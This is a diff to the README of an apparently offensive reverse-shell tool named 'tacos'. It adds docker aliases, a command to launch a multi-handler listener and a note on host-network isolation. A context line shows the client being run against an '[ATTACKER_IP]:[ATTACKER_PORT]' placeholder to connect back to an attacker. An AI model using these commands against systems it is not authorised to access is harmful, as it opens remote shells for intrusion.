@@ -34,13 +34,22 @@ tmux
 ./tacos [ATTACKER_IP]:[ATTACKER_PORT]       # or .\tacos.exe [ATTACKER_IP]:[ATTACKER_PORT] for windows
 # 💥
 ```
-### With container
 
+### With docker (recoomanded)
+Source aliases *(for simplicity)*:
 ```shell
-docker --net host --rm -it tacos [LISTENING_IP] [LISTENING_PORT]
-#alias tacos.container='docker --net host --rm -it tacos'
-#alias tacos.windows.container='docker --net host --rm -it tacos-windows'
+alias tacos.container='docker --net host --rm -it tacos'
+alias tacos.windows.container='docker --net host --rm -it tacos-windows'
 ```
+
+Launch multi-handler listener:
+```shell
+tacos.container [LISTENING_ADDR] [LISTENING_PORT]
+```
+
+***Notes about container security:***
+> From a networking point of view, this is the same level of isolation as if the process were running directly on the host and not in a container. However, in all other ways, such as storage, process namespace, and user namespace, the process is isolated from the host.
+
 ## Install
 
 ### Release
